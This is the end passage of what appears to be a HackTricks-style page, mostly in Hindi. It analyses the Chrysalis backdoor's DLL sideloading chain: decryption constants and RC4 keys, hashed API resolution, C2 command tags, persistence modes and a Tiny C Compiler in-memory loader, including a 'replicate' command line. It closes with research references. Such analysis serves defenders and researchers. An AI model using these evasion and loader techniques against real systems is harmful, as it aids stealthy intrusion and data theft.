- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, इसे **HIDDEN** मार्क करता है, एक renamed Bitdefender Submission Wizard `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` drop करता है, फिर EXE लॉन्च करता है।
- Host EXE `log.dll` को import करता है और `LogInit`/`LogWrite` को कॉल करता है। `LogInit` blob को mmap-load करता है; `LogWrite` इसे एक custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material पहले के hash से निकाला गया), buffer को plaintext shellcode से overwrite करता है, temps free करता है, और उस पर jump करता है।
- IAT से बचने के लिए, loader APIs को export नामों को hash करके resolve करता है using **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, फिर Murmur-style avalanche (**0x85EBCA6B**) apply कर के salted target hashes से compare करता है।

Main shellcode (Chrysalis)
- एक PE-जैसे main module को decrypt करता है by add/XOR/sub को key `gQ2JR&9;` के साथ पाँच पास में repeat करके, फिर import resolution पूरा करने के लिए dynamically `Kernel32.dll` → `GetProcAddress` load करता है।
- रनटाइम पर per-character bit-rotate/XOR transforms के माध्यम से DLL name strings reconstruct करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` को load करता है।
- एक दूसरा resolver उपयोग करता है जो **PEB → InMemoryOrderModuleList** को वॉक करता है, प्रत्येक export table को 4-byte ब्लॉकों में Murmur-style mixing से parse करता है, और सिर्फ़ तभी `GetProcAddress` पर fallback करता है जब hash नहीं मिलता।

Embedded configuration & C2
- Config गिराई गई `BluetoothService` फाइल के अंदर **offset 0x30808** (size **0x980**) पर रहती है और key `qwhvb^435h&*7` से RC4-decrypt होती है, जिससे C2 URL और User-Agent सामने आते हैं।
- Beacons dot-delimited host profile बनाते हैं, tag `4Q` prepend करते हैं, फिर `HttpSendRequestA` से पहले HTTPS पर key `vAuig34%^325hGV` से RC4-encrypt करते हैं। Responses RC4-decrypt होते हैं और tag switch द्वारा dispatch होते हैं (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)।
- Execution mode CLI args से gated है: no args = install persistence (service/Run key) जो `-i` की ओर इशारा करता है; `-i` self को `-k` के साथ relaunch करता है; `-k` install skip करता है और payload चलाता है।

Alternate loader observed
- उसी intrusion ने Tiny C Compiler drop किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` execute किया, जिसके बगल में `libtcc.dll` था। attacker-supplied C source ने embedded shellcode compile किया और बिना PE के, डिस्क को छुए बिना, in-memory चला दिया। Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- यह TCC-आधारित compile-and-run चरण runtime पर `Wininet.dll` को import किया और एक hardcoded URL से second-stage shellcode को खींचा, जिससे एक लचीला loader बनता था जो compiler run की तरह छिपता था।

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
